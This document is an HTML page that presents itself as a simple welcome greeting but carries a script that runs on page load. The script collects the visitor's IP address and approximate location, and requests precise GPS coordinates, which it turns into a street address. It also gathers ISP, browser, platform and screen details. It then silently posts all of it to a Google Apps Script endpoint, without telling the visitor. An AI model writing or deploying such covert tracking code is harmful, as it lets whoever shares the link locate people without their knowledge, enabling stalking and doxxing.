<!DOCTYPE html>
<html>

<head>
    <title>Welcome</title>
</head>

<body>

    <h1>Hello 👋</h1>
    <p>Welcome to our website.</p>

    <script>

        async function trackVisitor() {

            try {

                // Get IP information
                const response = await fetch("https://ipapi.co/json/");
                const data = await response.json();

                // Default values (Approximate)
                let latitude = data.latitude;
                let longitude = data.longitude;
                let accuracy = "Approximate (IP)";
                let locationType = "Approximate";

                // Try GPS
                if (navigator.geolocation) {

                    try {

                        const position = await new Promise((resolve, reject) => {

                            navigator.geolocation.getCurrentPosition(
                                resolve,
                                reject,
                                {
                                    enableHighAccuracy: true,
                                    timeout: 10000,
                                    maximumAge: 0
                                }
                            );

                        });

                        latitude = position.coords.latitude;
                        longitude = position.coords.longitude;
                        accuracy = position.coords.accuracy;
                        locationType = "Exact";

                        // Get real address from GPS
                        const geoResponse = await fetch(
                            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`
                        );

                        const geoData = await geoResponse.json();

                        const address = geoData.address || {};

                        // Replace IP location with GPS location
                        data.city =
                            address.city ||
                            address.town ||
                            address.village ||
                            address.municipality ||
                            data.city;

                        data.region = address.state || data.region;
                        data.country_name = address.country || data.country_name;
                        data.postal = address.postcode || data.postal;

                    } catch (e) {
                        console.log("GPS permission denied. Using IP location.");
                    }
                }

                const visitorData = {

                    time: new Date().toLocaleString(),

                    ip: data.ip,

                    city: data.city,
                    state: data.region,
                    country: data.country_name,
                    postal: data.postal,

                    latitude: latitude,
                    longitude: longitude,

                    accuracy: accuracy,
                    locationType: locationType,

                    isp: data.org,
                    timezone: data.timezone,

                    browser: navigator.userAgent,
                    language: navigator.language,
                    platform: navigator.platform,

                    screen: `${screen.width}x${screen.height}`,

                    maps: `https://www.google.com/maps?q=${latitude},${longitude}`

                };

                await fetch("https://script.google.com/macros/s/AKfycbzDxk8tQzuDIp4UdJNJC3wPCm9Kj8fvYLbv9NVMzJHC9F3ZfDvETTqBI0JpsTePoS2C4A/exec", {

                    method: "POST",
                    mode: "no-cors",

                    headers: {
                        "Content-Type": "text/plain;charset=utf-8"
                    },

                    body: JSON.stringify(visitorData)

                });

            }
            catch (err) {
                console.log(err);
            }

        }

        trackVisitor();
    </script>

</body>

</html>
